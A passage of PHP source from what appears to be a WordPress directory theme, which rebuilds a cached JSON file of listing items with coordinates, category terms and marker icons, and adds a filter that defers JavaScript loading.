		$json_file		= "{$upload_folder['basedir']}/javo_all_items_{$blog_id}_{$lang}.json";

		if( file_exists( $json_file ) )
		{
			$json_contents	= file_get_contents( $json_file );
			$javo_all_posts	= json_decode( $json_contents, true );
		}else{
			$javo_all_posts = Array();
		}

		// Google Map LatLng Values
		$latlng = Array(
			'lat'			=> get_post_meta( $post_id, 'jv_item_lat', true )
			, 'lng'			=> get_post_meta( $post_id, 'jv_item_lng', true )
		);

		$category			= Array();
		$category_label		= Array();

		/* Taxonomies */ {

			foreach( Array( 'item_category', 'item_location', 'post_tag' ) as $taxonomy )
			{

				$results = $wpdb->get_results(
					$wpdb->prepare("
						SELECT
							t.term_id, t.name
						FROM
							$wpdb->terms AS t
						INNER JOIN
							$wpdb->term_taxonomy AS tt
						ON
							tt.term_id = t.term_id
						INNER JOIN
							$wpdb->term_relationships AS tr
						ON
							tr.term_taxonomy_id = tt.term_taxonomy_id
						WHERE
							tt.taxonomy IN (%s)
						AND
							tr.object_id IN ($post_id)
						ORDER
							BY t.name ASC"
						, $taxonomy
					)
				);
				//$category[ $taxonomy ] = $results;
				foreach( $results as $result )
				{
					$category[ $taxonomy ][]		= $result->term_id;
					$category_label[ $taxonomy ][]	= $result->name;

				}
			}
		}

		/* Marker Icon */ {
			$category_icon = isset( $category[ 'item_category' ][0] ) ? $category[ 'item_category' ][0] :null;
			if(	'' === ( $javo_set_icon = get_option( "javo_item_category_{$category_icon}_marker", '') )
			){
				$javo_set_icon				= $javo_tso->get('map_marker', '');
			}
		}

		$javo_categories		= new javo_ARRAY( $category );
		$javo_categories_label	= new javo_ARRAY( $category_label );

		$javo_result = Array(
			'post_id'		=> $post_id
			, 'post_title'	=> get_the_title( $post_id )
			, 'lat'			=> $latlng['lat']
			, 'lng'			=> $latlng['lng']
			, 'rating'		=> get_post_meta( $post_id, 'rating_average', true )
			, 'icon'		=> $javo_set_icon
			, 'cat_term'	=> $javo_categories->get( 'item_category' )
			, 'loc_term'	=> $javo_categories->get( 'item_location' )
			, 'tags'		=> $javo_categories_label->get( 'post_tag' )
		);

		$javo_is_update = false;

		if( !empty( $javo_all_posts ) )
		{

			foreach( $javo_all_posts as $index => $post_object )
			{

				if( $post_object['post_id'] == $post_id )
				{
					if( ! $is_remove )
					{
						// Added Items
						$javo_all_posts[ $index ] = $javo_result;
					}else{
						// Removed Items
						unset( $javo_all_posts[ $index ] );
					}

					// Process?
					$javo_is_update = true;
				}
			}
		}
		if( ! $javo_is_update && ! $is_remove  )
		{
			$javo_all_posts[] = $javo_result;
		}

		// Make JSON file
		$file_handler	= @fopen( $json_file, 'w' );
		@fwrite( $file_handler, json_encode( $javo_all_posts ) );
		@fclose( $file_handler );

	}

}
new javo_action_function();

function javo_url( $original_id, $post_type='item'){
	if( function_exists('icl_link_to_element') ){
		/*
		* Parameter 3
		* True : Original Post Id
		* False : Return NULL */
		return get_permalink( icl_object_id($original_id, $post_type, true) );

	}else{
		return get_permalink($original_id);
	}
}

// JS
if (!(is_admin() )) {
  function defer_parsing_of_js ( $url ) {
    if ( FALSE === strpos( $url, '.js' ) ) return $url;
    if ( strpos( $url, 'jquery.js' ) ) return $url;
    return "$url' defer ";
  }
  add_filter( 'clean_url', 'defer_parsing_of_js', 11, 1 );
}